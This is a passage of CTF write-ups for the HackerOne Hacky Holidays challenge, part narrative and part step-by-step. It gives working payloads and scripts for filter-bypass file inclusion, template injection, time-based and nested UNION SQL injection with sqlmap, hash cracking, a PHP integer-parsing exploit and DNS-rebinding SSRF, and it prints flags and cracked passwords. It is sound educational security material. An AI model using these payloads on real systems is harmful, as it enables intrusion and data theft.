Now Mr.R3b00t was having credentials for the Grinch's Internal login portal he quickly logged in and soon enough he found that there is nothing inside it.(wait.. what??)

{F1138039}

"He must be hiding something, it can't be empty" Mr.R3b00t said with a frown on his face.

He decided to investigate deeper and found out that the session token is a base64 string with the following JSON data.

{F1138041}

Mr.R3b00t Changed admin to "true" and replayed the request and BOOM! he had access to Grinch's personal files.

{F1138043}

The zip file found was also password protected but this time Mr.R3b00t exactly knew how to open it up. Mr.R3b00t transferred the file onto his own laptop, fired up Kali and cracked the ZIP file pass using "fcrackzip".

{F1138044}

Unzipping the file revealed that Grinch is definitely not just interested in "destroying Christmas"(Naughty Grinch).

{F1138045}
{F1138046}
(This pic literally gave me nightmares.)

Mr.R3b00t took a peak in the diary.txt file and found out a link to his online diary.

{F1138056}

"This is his personal diary, I think he might have mentioned something in it about his evil plans"..Mr.R3b00t Gathered everything he can from Grinch's house put everything back to it's place and removed every possible trace...

**_Episode - 0x06_ secretadminsecretadmin.phpadminadmin.php.php.php**

A first look at Grinch's diary was not revealing anything sensitive.

{F1138063}

From initial recon Mr.R3b00t found out there are following hidden files present on the site.

{F1138065}

And the page /my-diary was always redirecting to /my-diary/?template=entries.html looked like the site is including data from other pages present in the dirs.

So index.php was present on the site but it was redirecting to /my-diary/?template=entries.html If the site is including code from other files might be possible there is also a way to read the contents of index.php

Mr.R3b00t quickly changed the "entries.html" to "index.php" and sent the request to "https://hackyholidays.h1ctf.com/my-diary/?template=index.php" and soon enough he had the source code for "index.php"

{F1138066}

"Hmmmm, so he changed the admin page to "secretadmin.php", but he is restricting the access to secretadmin.php".

The index.php was having three filters; preg_replace() which was filtering out non-alphanumeric character except for the character "." .

And two str_replace() filters to restrict access to admin.php and secretadmin.php, It was time to find out the perfect payload to bypass all the filters.

Mr.R3b00t tried multiple directory traversal payloads but nothing worked because everytime you will put a char "/" or string "admin.php" or "secretadmin.php" in the payload it will get filtered out...Looked like directory traversal isn't the way, it was time to play with the str_replace() function.

_____________________________________________________________________________________________________
## Trivia
_____________________________________________________________________________________________________

Hey! its d3f4u17 let's find out some interesting facts about `str_replace()` function.

PHP str_replace() function replace all occurrences of the search string with the replacement string.

Example :-
```php
php > $y="hello grinch"; 
php > $x=str_replace("grinch", "", $y);
php > echo $x;
hello
```
In the above example, str_replace() will remove all occurrences of the string "grinch" with "" in the string "hello grinch".

But still a properly crafted input can bypass the replace filter for example:- the input string "hello grincgrinchh" when passed through str_replace("grinch", "", $y); will give "hello grinch" as output. Similar technique was used to bypass the str_replace() filters for this challenge.

{F1138067}
_____________________________________________________________________________________________________

After trying some test inputs Mr.R3b00t found the ultimate payload to bypass both the str_replace() filters

```
secretadminsecretadmin.phpadminadmin.php.php.php
```

When the above payload will be passed through the first filter `$page = str_replace("admin.php","",$page);` the resultant string would be "secretadminsecretadmin.php.php"

Now when the string "secretadminsecretadmin.php.php" will pass through the second filter the resultant string would be "secretadmin.php". Now Mr.R3b00t had the perfect payload he quickly added the payload to ?template= param and sent the request to https://hackyholidays.h1ctf.com/my-diary/?template=secretadminsecretadmin.phpadminadmin.php.php.php

The payload worked and The admin page loaded..

{F1138078}

A draft was present on the admin dashboard and it was revealing the ultimate plan of The Grinch to ruin this year's christmas. "This is horrible! Is this what he is planning? If he succeeds Santa won't be able to distribute the presents, I have to stop him"..

Mr.R3b00t now knew what the Grinch was planning, will he be able to stop him? Will Grinch succeed in his evil agenda?? We will find out soon..

**_Episode - 0x07_ Inj3cti0n**

Few hours pass by, no strange activities were found on the Grinch Network. Ping!! A email notification came in, Mr.R3b00t checked the mail.

{F1138081}

"What?? How did he get my mail?? Does he know I am after him??" Looks like Mr.R3b00t was not the only one who got the mail, Mr.R3b00t's friends also got the mail, Grinch was sending mass mail to Christmas loving People.

So if he is sending mail there has to be someplace from where he is doing it, It took Mr.R3b00t few seconds to find out the mail generating portal https://hackyholidays.h1ctf.com/mail-generator

Mr.R3b00t soon found out the template he used to Generate the mass mail.

{F1138082}

The message contained a markup with placeholders {{name}} and {{template:}} which was including some kind of html file inside the body.

It's a thumb rule for Mr.R3b00t to do a dirsearch with it's in-built wordlist in the initial recon process, and it never disappoints. The dirsearch reveals a hidden directory "templates".

{F1138085}

The templates folder revealed some HTML files two of them were used in the previously drafted mail.

{F1138086}

The one that caught Mr.R3b00t's interest was the third one 

`38dhs_admins_only_header.html` (The word admin always excite him)

Now, Mr.R3b00t needs to find a way to use this template.

Exploring the other features, Mr.R3b00t found out that one can also craft a mail template at https://hackyholidays.h1ctf.com/hate-mail-generator/new and can preview it at https://hackyholidays.h1ctf.com/hate-mail-generator/new/preview

The initial request to the /preview looked as below:-

{F1138087}

Mr.R3b00t quickly tried using the `{{template:}}` placeholder to include the file 38dhs_admins_only_header.html but it wasn't that simple

{F1138093}

A permission denied error popped up.

After playing with the parameters, Mr.R3b00t found that custom params can be defined in the `preview_data` POST param and then can be used in `preview_markup`. E.g.

{F1138095}

One more thing that needs to be observed was whatever input was given in the placeholder was getting reflected as it is without any filters.

{F1138096}

After trying few payloads, Mr.R3b00t said "If everything is getting reflected why not pass the template placeholder itself in the custom placeholder".

Mr.R3b00t tried the payload `{"test":"{{template:38dhs_admins_only_header.html}}"}` and it worked like a charm.

Final PoC:-

```bash
curl -X POST -sk -H "Content-Type: application/x-www-form-urlencoded" -d 'preview_markup=Hello+{{test}}+&preview_data={"test":"{{template:38dhs_admins_only_header.html}}"}' https://hackyholidays.h1ctf.com/hate-mail-generator/new/preview | grep -Eoi "flag{[^>]+}"
```
{F1138099}
{F1138098}

"Adam?? This can't be true, was he helping The Grinch all this time?" it was a total shock for Mr.R3b00t. Adam is a renowned CTF creator in cybersecurity world and a close friend of Mr.R3b00t(I don't know about Mr.R3b00t, but Adam ain't a friend of mine but I would love to be his friend :) )...episode ends.

**_Episode - 0x08_ B3tR4y4l**

It wasn't time for Mr.R3b00t to think about what Adam did but to focus on the plan to stop Grinch. The forum was already online.

{F1138116}

Initial recon on the forum revealed a phpmyadmin page and a login page for users and also might be for admins, Mr.R3b00t tried bypassing the login using bruteforcing user and pass, default creds, older version CVEs but nothing worked. Also, IDORs were also not the case with this one.

{F1138118}

"I think it's time to hack Adam "Mr.R3b00t quickly started looking for Adam's online activities(Thanks @chron0x for the hint on this one :) ) soon enough Mr.R3b00t found Adam's Github profile https://github.com/adamtlangley There wasn't any thing suspicious in his repositories but you know Github is all about contribution, Adam's latest activities revealed a commit to "Grinch-Networks" Github profile.

{F1138119}

"Mr.R3b00t at this point of time was 100% sure about Adam's involvement in the Grinch's plan".

Mr.R3b00t opened the repo https://github.com/Grinch-Networks/forum , The forum was written in PHP after looking at some files in the source code Mr.R3b00t was sure that DB interaction is taking place in the forum app, now if there is a DB there has to be a connection file for it.

Soon enough Mr.R3b00t found the DB.php file inside the repo which would be getting used to make connection with the backend database, It was time to see if there are any credentials present for the DB or not.

{F1138120}

"After all it's Adam, he won't do a rookie mistake like that", Mr.R3b00t said. 

MR.R3b00t was going back and take a look at other files but his sharp vision found this.

{F1138122}
{F1138123}

There was an inital commit for the file DB.php, after looking at the history of DB.php Mr.R3b00t went to the exact same line and this time he found the DB creds. 

https://github.com/Grinch-Networks/forum/commit/07799dce61d7c3add39d435bdac534097de404dc#diff-998930400b08c30f6949f365207fd1d0c693d22ae5de6b9de752ef5c57ce9754R134

{F1138124}

"After all, Git is nothing but a stupid content tracker", Mr.R3b00t said. In his initial recon Mr.R3b00t found a phpmyadmin page on the forum, he tried the creds over there and it worked like a charm.

The DB user had access to the "users" table, the table was having username and hashed passwords.

{F1138126}

Cracking the hashes revealed the password for the user "grinch"

{F1138127}

It was time to login to the admin account using creds "grinch:BahHumbug", The admin account was having a post under "secret plans".

{F1138128}

From this moment onwards it was a race against time for Mr.R3b00t as Grinch has already deployed his recon servers once he gets his hands on Santa's IPs he will launch the DDoS attack.

**_Episode - 0x09_ sl33p**

Mr.R3b00t now have to find a way to access The recon servers but no initial links were found, Grinch was now running a Quiz on his website "Sadistic evil creep", Mr.R3b00t took a look at it in hope of finding a lead on the recon servers.

{F1138130}

At first Glance, it looked like a normal quiz with some crazy questions and options(What do you expect from a Green Ugly Monster) and an admin login page.

On a bit deep investigation Mr.R3b00t found out the flow of the quiz

```
--> /evil-quiz/ --> /evil-quiz/start/ --> /evil-quiz/score 
```

The following requests were being made on each step.

{F1138131}
{F1138132}
{F1138133}

One more thing Mr.R3b00t noted was that the 'name' param was getting reflected at the `/evil-quiz/score` page.

It was time to fuzz the parameters, soon enough Mr.R3b00t found an unusual behaviour the payload `' or (select sleep(15))-- -` when passed via name parameter was taking much time to return the response as compared to others at this point Mr.R3b00t was a bit sure about the possible vulnerability behind the behaviour.

Mr.R3b00t quickly fired up SQLmap and ran the following command.

```
$python3 sqlmap.py -u https://hackyholidays.h1ctf.com/evil-quiz --data "name=chron0x" -p "name" --method POST --second-url "https://hackyholidays.h1ctf.com/evil-quiz/score" --cookie="session=<session_cookie>" --current-db
```

Soon Mr.R3b00t assumptions became true, and he was sure that it is indeed a Time-Based SQLi

{F1138139}

Mr.R3b00t was able to find the DB name as "quiz", now it was time to enumerate tables 

```
$python3 sqlmap.py -u https://hackyholidays.h1ctf.com/evil-quiz --data "name=chron0x" -p "name" --method POST --second-url "https://hackyholidays.h1ctf.com/evil-quiz/score" --cookie="session=<session_cookie>" -D quiz --dump
```

The above sqlmap revealed two tables "sessions and "admin", looking at the content of "sessions", the table was not of much use so MR.R3b00t had the target table to look at.

```
$python3 sqlmap.py -u https://hackyholidays.h1ctf.com/evil-quiz --data "name=chron0x" -p "name" --method POST --second-url "https://hackyholidays.h1ctf.com/evil-quiz/score" --cookie="session=<session_cookie>" -D quiz -T admin --dump
```

The table admin dumped the admin credentials

{F1138143}

Mr.R3b00t logged in to the admin panel using the extracted Creds.

{F1138144}

**_Episode - 0xA_ H4ck3rz for Hire**

Grinch has speed up the process and has started hiring people on his website for his DDoS attack. Mr.R3b00t is still looking for clues to have access on Grinch's Recon server.

The page had a registration form and a login form.

{F1138145}

The basic flow was, a user can register and then login on the page, after login the user was shown the following message.

{F1138146}

Initial recon revealed the following files and directories.

> Tip: For quick finds use dirsearch, it's an amazing tool with an in-built oneforall wordlist.

{F1138148}

Both user.php and index.php were flashing the error "You cannot access this page directly" when visited directly. The README.md file was a gold mine though, it revealed a "signup-manager" app which has been deployed on the site, the readme file had the usage and install instructions along with the default creds for the admin but as expected default creds were not working.

{F1138150}

After reading the install instructions Mr.R3b00t found out that signupmanager.zip needs to be moved and unzip in the installation directory, there was a possibility that the file could be still present on the server. So MR.R3b00t requested the following URL https://hackyholidays.h1ctf.com/signup-manager/signupmanager.zip and voila Mr.R3b00t was able to download signupmanager.zip file.

The zip file contained the source code of the signup app.

{F1138152}

Now to find the perfect exploit Mr.R3b00t ran the app on his local machine and performed some basic actions such as login, register etc.

The app was storing the users credentials in a file "users.txt" instead of a database, The file had the following format to store the user info.

{F1138153}

There is one more thing that needed to be observed from the README.md file , it was mentioned in the file that "You can make anyone an admin by changing the last character in the users.txt file to a Y" by d3f4u17 the last character was being set as 'N' for non-admin users.

"If somehow I can overwrite the last character to 'Y' I can register as an admin",Mr.R3b00t said. The theory was accurate for an exploit but there were multiple restrictions imposed in the code to do so.

In the index.php file, the `addUser` function is formatting and padding all the parameters except for the hashed password as it is a constant 32 char string. In the end a sub-string of length 113 was being extracted from the final string.

{F1138154}

There were also validations in place to check for the length of the passed parameters for the user signup code

{F1138155}

Every parameter was getting passed through substr() function to make sure that the params do not exceed their specified length except for one, the parameter "age", one more thing that need to be noticed is that param "age" is getting validated by strlen() , is_numeric() and in the end intval() function was being used to fetch the integer value for the passed age value.

Mr.R3b00t decided to play with these three functions, After some research Mr.R3b00t found out that there are ways in PHP to express larger values in a shorter form.

For example "1e3" in PHP represents 1 x 10^3. Also, it can bypass both strlen and is_numeric.

{F1138156}

Mr.R3b00t now have the perfect exploit in hand, the following values will do the Job and would overwrite the last character.

```
curl 'http://localhost/signupmanager/' -H 'Content-Type: application/x-www-form-urlencoded' -d 'action=signup&username=test123&password=password&age=1e9&firstname=foo&lastname=mypayloaY'
```

When the above values will be passed the values in the variables will be as shown below

{F1138160}

The substr function will extract only the 113 characters from the resultant string which will make char 'Y' from the lastname param as the ending character.

```
test123########5f4dcc3b5aa765d61d8327deb882cf99d81fac0b735b75cfae76604798479b6d1000000000foo############mypayloaY
```

It was time to test the exploit on the actual website, Mr.R3b00t passed the following request and got successfully redirected to the Admin page.

{F1138164}
{F1138168}

Mr.R3b00t finally had the lead on the recon server The admin area was having the link for the recon server https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59, It was time for the final showdown.

**_Episode - 0xB_ Inc3pti0n**

Mr.R3b00t now have access to the recon server but he still needs to stop the DDoS, the site https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59 was having some albums and photos of Santa(Does he hate him or obsessed with him??) that Grinch collected over the years and our lovely login page "Attack box".

From initial recon Mr.R3b00t found out the following information

{F1138169}

The /uploads/ dir was giving a 403 and the /api/ endpoint has some sort of API docs for the site.

{F1138170}

Enumerating the API endpoint always resulted in a 401 unauthorised, So Mr.R3b00t had to find a way to bypass this restriction so that he can enumerate the endpoints for /api/* other things that Mr.R3b00t found out, the site was having albums and albums were having photos.

For fetching an album the following request was being made  https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=jdh34k and for fetching the pictures the following request was being made https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/picture?data=eyJpbWFnZSI6InIzYzBuX3NlcnZlcl80ZmRrNTlcL3VwbG9hZHNcLzEzZDc0NTU0YzMwZTEwNjk3MTRhNWE5ZWRkYThjOTRkLmpwZyIsImF1dGgiOiI5NGZiMzk4ZDc4YjM2ZTdjMDc5ZTc1NjBjZTlkZjcyMSJ9

On decoding the base64 The following JSON string was obtained.

```json
{"image":"r3c0n_server_4fdk59\/uploads\/13d74554c30e1069714a5a9edda8c94d.jpg","auth":"94fb398d78b36e7c079e7560ce9df721"}
```
Looks like internal URL calling was being done, also an "auth" key was being passed , changing the path in the "image" key resulted in "invalid authenticated hash" error, somehow the "image" and "auth" keys were associated.

{F1138171}

After playing around for sometime Mr.R3b00t finally got a lead. The "hash" param was vulnerable to SQL injection, The request to `https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=%27%20UNION%20SELECT%201,NULL,NULL;--` was returning all the photos present in the first album

Similarly, the request to `https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=%27%20UNION%20SELECT%202,NULL,NULL;--` was returning photos from the second album.

Soon after this, Mr.R3b00t fired up sqlmap and excute the following command

```
Python3 sqlmap.py -u https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=jdh34k --method get -p "hash" --dbs
```

The param was indeed vulnerable to sqli, sqlmap dumped two databases.

{F1138173}

"recon" was kinda interesting, Next off it was time to dump the tables for "recon".

{F1138172}

"It is making total sense now! Now I know why the request was dumping the photos for the first album" ..Mr.R3b00t said

___________________________________________________________________________________________________
## Trivia
___________________________________________________________________________________________________

Hey! It's d3f4u17 again, Let me explain you what Mr.R3b00t understood after looking at the dumped schema.

The request that Mr.R3b00t made earlier `https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=%27%20UNION%20SELECT%201,NULL,NULL;--` was exploiting the query which was being used in the backend for the table "album".

So the query that might be getting used in the backend would be something like this

```sql
select id, hash, name from album where hash='?';
```

Now these are the payloads that helped MrR3b00t identifying the correct column count.

```sql
' UNION select NULL;-- --> 404
' UNION select NULL,NULL;-- --> 404
' UNION select NULL,NULL,NULL;-- --> 200; column count is three
' UNION select NULL,NULL,NULL,NULL;-- --> 404
```

Once Mr.R3b00t had the column count he started fuzzing the first column and the payload `' UNION select 1,NULL,NULL;--` returned the photos from the first album.

Now if we append our payload `' UNION select 1, NULL, NULL;--` it will make the resultant query as:-

```sql
select id, hash, name from album where hash='' UNION select 1, NULL, NULL;--
```

The above query when executed will generate the following data.

```
MariaDB [test]> select id, hash, name from album UNION select 1,null,null;
+----+------+------+
| id | hash | name |
+----+------+------+
|  1 | NULL | NULL |
+----+------+------+
1 row in set (0.002 sec)
```

Also the column count in the union must be matching otherwise error will popup at the backend which is nothing but the 404 page.

But if we will request the following `https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=%27%20UNION%20SELECT%201,NULL,NULL;--` the page is returning the images, this behaviour suggests that there is more than one query which is getting executed in the background because the first query is just returning the 'id' column.

Now if I am right the second query that might be executing to fetch the images from the "photo" table would be.

`select id, album_id, photo from photo where album_id='?'`, now the id column from the output of first query is being fed to the second query to get the photos.

So if we will provide a  payload something like below

```
MariaDB [test]> select id, hash, name from album UNION select "' UNION select null,null,'xyz.jpg'",null,null;
+------------------------------------+------+------+
| id                                 | hash | name |
+------------------------------------+------+------+
| ' UNION select null,null,'xyz.jpg' | NULL | NULL |
+------------------------------------+------+------+
1 row in set (0.108 sec)
```

Now the payload `' UNION select null,null,'xyz.jpg'` will be fed to the second query which will make it .

```
select id, album_id, photo from photo where album_id='' UNION select null,null,'xyz.jpg'

MariaDB [test]> select id, album_id, photo from photo where album_id='' UNION select null,null,'xyz.jpg'
    -> ;
+------+----------+---------+
| id   | album_id | photo   |
+------+----------+---------+
| NULL |     NULL | xyz.jpg |
+------+----------+---------+
1 row in set (0.078 sec)
```

Now if we will request `https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=' UNION SELECT "' UNION select NULL,NULL,'xyz.jpg';--",NULL,NULL;--`

We will get the following response

{F1138181}

Decoding the base64 will give the following output.

```json
{"image":"r3c0n_server_4fdk59\/uploads\/xyz.jpg","auth":"5717163084e61f4b89336af25ae5d503"}
```

As you can see the xyz.jpg provided in the payload is getting reflected in the base64 string the "auth" token for the respective path is also being generated by the server , what if we provide "../api/test" in our payload

{F1138183}

So we can now alter the path in the "image" also, requesting the URL https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/picture?data=eyJpbWFnZSI6InIzYzBuX3NlcnZlcl80ZmRrNTlcL3VwbG9hZHNcL3h5ei5qcGciLCJhdXRoIjoiNTcxNzE2MzA4NGU2MWY0Yjg5MzM2YWYyNWFlNWQ1MDMifQ== will now give the response as "Expected HTTP status 200, Received: 404"

Looks like we are now able to successfully call the /api/* endpoints from internal server.

Also the api document suggests that 404 refers to no valid endpoint, It was time for sum fuzzing. Now let's get back to the story..
___________________________________________________________________________________________________________

Mr.R3b00t decided to create the script F1138199 to automate the process of enumerating the api endpoints.

```bash
#!/bin/bash

YELLOW="\e[93m"
NORMAL="\e[39m"

OP=`curl -sgi "https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=x' UNION SELECT \"' UNION SELECT null,null,'$1'--+\",null,null--+" | grep -Eoi "src=\"\/r[^+]+\"" | cut -d '"' -f 2`
OP_TWO=`curl -GkLs "https://hackyholidays.h1ctf.com$OP"`
echo -e "${YELLOW}[$1]${NORMAL} : $OP_TWO"
```

Using a proper wordlist from seclist did the JOB and  Mr.R3b00t found two valid endpoints

```bash
cat /usr/share/seclists/Discover/Web-Content/api/objects/txt | xargs -n 1 -P 20 -I {} ./newscript.sh ../api/{}
```
{F1138187}
{F1138187}

Mr.R3b00t now had the valid endpoints, now the next step was to enumerate the params endpoints

```bash
cat /usr/share/seclists/Discover/Web-Content/api/objects/txt | xargs -n 1 -P 20 -I {} ./newscript.sh ../api/user?{}=
```

{F1138196}
{F1138197}

The params "username" and "password" were two valid params for the endpoint /api/user. No valid endpoints were found on the /api/ping param though.

Trying bruteforcing username and password didn't work out but while fuzzing the params Mr.R3b00t found out that '%' sign is allowed as a wildcard.

{F1138194}

"Boolean based character matching" can be done using this behaviour, Mr.R3b00t quickly created a new script F1138200 to enumerate username and password.

```bash
#!/bin/bash

OP=""
USER=""
CHAR=""
VALID=""

echo -e "extracting $1.."

while [ 1 ]; do
for i in $(cat chars); do
    OP=`./newscript.sh ../api/user?$1=$CHAR$i%25 | grep -oi invalid | wc -c`
    #echo -e "Testing -> $CHAR$i"
    if [[ $OP -eq 8 ]]; then
        #echo -e "Testing -> $CHAR$i"
        CHAR="$CHAR$i"
        echo -e "Found -> $CHAR"
        break
    fi
done
done
```
After executing the above script in just few minutes Mr.R3b00t had both username and password for the "attack box".

{F1138206}
{F1138205}

Without wasting anymore time Mr.R3b00t logged in to the attackbox using the creds "grinchadmin:s4nt4sucks" and what he saw next was pure horror.."Grinch has found Santa's IPs", Mr.R3b00t said.

**_Episode - 0xC_ 404 Not Found**

Grinch has found Santa's IPs and is ready to launch the attack, Mr.R3b00t have to stop the Grinch before the DDoS succeeds.

{F1138263}

Without wasting anymore time Mr.R3b00t started recon and looking for a loop hole in the recon app.

The "attack" button in front of each IP was launching DDoS against mentioned IP by requesting the following URL. https://hackyholidays.h1ctf.com/attack-box/launch?payload=eyJ0YXJnZXQiOiIyMDMuMC4xMTMuMzMiLCJoYXNoIjoiNWYyOTQwZDY1Y2E0MTQwY2MxOGQwODc4YmMzOTg5NTUifQ==

Decoding the base64 in the query string gives the following JSON String.

```json
{"target":"203.0.113.33","hash":"5f2940d65ca4140cc18d0878bc398955"}
```

The key "target" was holding the target IP and the key "hash" was holding a token associated with the IP, Changing the IP and replaying the request gave the following error

{F1138267}

The "hash" was associated with the "target" just like we saw earlier.

After trying multiple things Mr.R3b00t was completely blank as nothing was working or exploitable, time was running out at anytime the attack could be launched.

The only last resort remaining was  to crack the hashes Mr.R3b00t wasn;t expecting much from this but he wasn't having any other choice.

Mr.R3b00t fired up hashcat and ran the following commandf ro cracking MD5s.

```
hashcat -m0 -o crack.txt -O 5f2940d65ca4140cc18d0878bc398955 /usr/share/wordlists/rockyou.txt
```

But as expected It didn't work out. "Wait! what if the hashes are salted?", Mr.R3b00t said.

Just to try his luck Mr.R3b00t tried again and assumed the salt as the target IP.

```
hashcat -m10 -O -o crack.txt 5f2940d65ca4140cc18d0878bc398955:203.0.113.33 /usr/share/wordlists/rockyou.txt
```

And miraculously, it worked! Mr.R3b00t found the hidden salt "mrgrinch463".

{F1138269}

Mr.R3b00t now have the salt it was time to test it,  Mr.R3b00t quickly generated a hash to target the loopback IP.

```
php > echo md5("mrgrinch463127.0.0.1");
3e3f8df1658372edf0214e202acb460b
php >

```
Mr.R3b00t was able to bypass the "Invalid protection hash" error but got restricted again as there were restrictions to launch attack on internal IPs.

{F1138271}
{F1138272}

After multiple failed attempt to target the internal host, Mr.R3b00t decided to do a bit research and few minutes later found this https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery#bypassing-using-dns-rebinding-toctou

There was a way to target Internal IP using DNS rebinding, Mr.R3b00t used a service https://lock.cmpxchg8b.com/rebinder.html (didn't use 1u.ms as it is very buggy)
Mr.R3b00t hashed the target host and made the final payload(The payload of destruction).

https://hackyholidays.h1ctf.com/attack-box/launch?payload=eyJ0YXJnZXQiOiIwMTAyMDMwNC43ZjAwMDAwMS5yYm5kci51cyIsImhhc2giOiI2OWMzMWNkY2ZhZDNlZjFkZWI2NTJmNGFjYTUyZDJjYyJ9

After loading the above URL twice Mr.R3b00t saw and end to Grinch's agenda.

{F1138275}

"Finally! It's over..",Mr.R3b00t smiled. He successfully took down the Grinch and respected his vow.

## Impact

h1ctf grinch network CTF writeup.

**Summary (researcher):**

A huge shoutout to the entire #grincharmy @bendtheory @h3x0ne @bughunterlabs @castilho @mava @panya, you guys are awesome and we made a great team :)

---

### [H1 Hackyholidays CTF - The Grinch was defeated](https://hackerone.com/reports/1069467)

- **Report ID:** `1069467`
- **Severity:** Critical
- **Weakness:** Uncategorized
- **Program:** h1-ctf
- **Reporter:** @val_brux
- **Bounty:** - usd
- **Disclosed:** 2021-01-11T22:24:18.146Z
- **CVE(s):** -

**Vulnerability Information:**

The following writeup will underline all the steps and tools used to solve the 12 challenges of the H1 Holidays CTF. The theme of the competition was the Grinch. How it is possible to read from the competition blog post https://www.hackerone.com/blog/12-days-hacky-holidays-ctf , the goal was to shut down the grinch network and save the Christmas. Let's get wired! 

I attached a ZIP file containing all the wordlists and the Python scripts in the report.

##Tools used:
For this competition, I made a large use of Burp Suite + Google Chrome, together with some custom Python3 scripts created for some of the challenges.

{F1140318}

#Challenge 1 
In the first challenge (which was not yet a real challenge), it was necessary to browse the competition webpage (https://hackyholidays.h1ctf.com/). It appeared like the following:

{F1140319}

Without any further indication, the first thing I decided to try was to perform a directory bruteforce to find interesting files (I used the Burp "Content Discovery"). After some seconds, I discovered that the robots.txt file was accessible on the web server.

{F1140320}

The robots.txt file contained two important information. 
- The first flag - flag{48104912-28b0-494a-9995-a203d1e261e7}
- The endpoint for the next challenge  - /s3cr3t-ar3a

The following Python script allows to gather the first flag
```
#!/usr/bin/python3
import requests
import re

if __name__ == "__main__":
    print("[*] Challenge 1")
    url = "https://hackyholidays.h1ctf.com:443/robots.txt"
    r = requests.get(url)
    r1 = re.findall(r"flag\{[\w-]+\}",r.text)
    print("[*] Flag in robots.txt: {}".format(r1[0]))
```

#Challenge 2
By navigating to the endpoint exposed in the first challenge, it was possible to access the second challenge.

https://hackyholidays.h1ctf.com/s3cr3t-ar3a

{F1140321}

This was difficult to solve without a browser, because the flag was loaded inside the webpage through Javascript, as shown in the following image:

{F1140322}

Flag: flag{b7ebcb75-9100-4f91-8454-cfb9574459f7}

The following script makes use of selenium to load the webpage, execute the JS code and retrieve the flag
```
#!/usr/bin/python3
import requests
from selenium import webdriver

if __name__ == "__main__":
    print("[*] Challenge 2")
    url = "https://hackyholidays.h1ctf.com/s3cr3t-ar3a"
    driver = webdriver.PhantomJS()
    driver.get(url)
    flag = driver.find_element_by_id(id_='alertbox').get_attribute("data-info")
    print("[*] Flag: {}".format(flag))
```

#Challenge 3
The third challenge was accessible by browsing https://hackyholidays.h1ctf.com/people-rater. What appeared on the webpage was a list of "people buttons" that when clicked triggered an alert on the screen.

{F1140323}

The alert was the result of a call to https://hackyholidays.h1ctf.com/people-rater/entry?id=PAYLOAD , where PAYLOAD was the a base64 encoded value.

{F1140324}

Decoding the value from base64, I got a JSON string containing an "id".

{F1140325}

I noticed that none of the users listed on the webpage had "id" equals to 1. I crafted a request with the value {"id":1} base64 encoded.

{F1140326}

And then the flag was returned by the server.

{F1140327}

Flag: flag{b705fb11-fb55-442f-847f-0931be82ed9a}

As already done for the previous challenges, following a script which exploits the challenge3

```
#!/usr/bin/python3
import requests
import base64
import json

if __name__ == "__main__":
    print("[*] Challenge 3")
    payload = json.dumps({"id": "1"})
    base64 = base64.b64encode(payload.encode("utf-8"))
    url = "https://hackyholidays.h1ctf.com/people-rater/entry?id={}".format(base64.decode('utf-8'))
    r = requests.get(url)
    j = r.json()
    print("[*] Flag: {}".format(j["flag"]))
```

#Challenge 4
The fourth challenge was accessible by browsing https://hackyholidays.h1ctf.com/swag-shop . The relative webpage contained some items of a shop.

{F1140328}

This challenge took me some time. First, I inspected the source code and discovered that some HTTP requests where made to various /api/* endpoints.

{F1140329}
{F1140331}

I tried to perform a file bruteforce with Burp "Content Discover" on the /api endpoint using a custom wordlist (attached in the report).  The following endpoints were discovered:

{F1140332}

/api/sessions returned a list of base64 encoded values. 

{F1140333}

Decoding the values, I noticed that one of them contained an UUID string as "user" property. 

{F1140334}

/api/user returned the following error message.

{F1140335}

It was necessary to discover the right parameters  to call the API. I used again a custom wordlist and Burp Intruder to find the right parameter: uuid.

{F1140336}
{F1140337}

1+1 is 2, therefore I used the previously found UUID in the /api/user request and retrieved the fourth flag.
https://hackyholidays.h1ctf.com/swag-shop/api/user?uuid=C7DCCE-0E0DAB-B20226-FC92EA-1B9043

{F1140338}

Flag: flag{972e7072-b1b6-4bf7-b825-a912d3fd38d6}
The following script exploits the challenge and retrieve the flag.
```
#!/usr/bin/python3
import requests
import base64
import json

if __name__ == "__main__":
    print("[*] Challenge 4")
    url = "https://hackyholidays.h1ctf.com/swag-shop/api/sessions"
    r = requests.get(url)
    j = r.json()
    for el in j["sessions"]:
        elencode = el.encode("utf-8")
        b64 = base64.b64decode(elencode)
        d = b64.decode("utf-8")
        j = json.loads(d)
        c = j['user']
        if(c is not None):
            url = "https://hackyholidays.h1ctf.com/swag-shop/api/user?uuid={}".format(c)
            r = requests.get(url)
            j = json.loads(r.text)
            print("[*] Flag: {}".format(j["flag"]))
            break
```

#Challenge 5
The fifth challenge was accessible by browsing https://hackyholidays.h1ctf.com/secure-login. The challenge webpage contained a login form requesting a username and password. 

{F1140339}

The first thing I noticed here was that a specific error message was returned when logging in with an invalid username.

{F1140340}

This was a strong sign of the possibility to perform username enumeration. Again I used a custom wordlist, Burp Intruder and the "Grep - Extract" feature to bruteforce the right username. 

{F1140341}
{F1140342}

The right username resulted in "access". The same process was repeated to bruteforce the password (with another custom wordlist), after having set the username POST parameter to "access".

{F1140343}
{F1140344}

 I found out that the password was "computer"
After having logged in, the web server returned an error message stating: "No Files to Download". Rabbit hole here we go! However, the session cookie set up after the login was interesting.

{F1140345}

Decoding the cookie from base64, I got the following value

{"cookie":"1b5e5f2c9d58a30af4e16a71a45d0172","admin":false}

What about turning that "admin" JSON property from false to true. 

{F1140346}

The initial cookie base64 was then replaced with the one obtained, and the content of the admin panel changed.

{F1140347}
{F1140348}

However, the .zip file required a password to be open. A simple zip bruteforce with the rockyou.txt wordlist allowed to retrieve the right password: hahahaha
The ZIP file contained a grinch image and a txt file containing the flag.

{F1140349}

Flag: flag{2e6f9bf8-fdbd-483b-8c18-bdf371b2b004}

#Challenge 6
The sixth challenge was accessible by browsing https://hackyholidays.h1ctf.com/my-diary/. The challenge contained some diary entries in a calendar format. 

{F1140350}

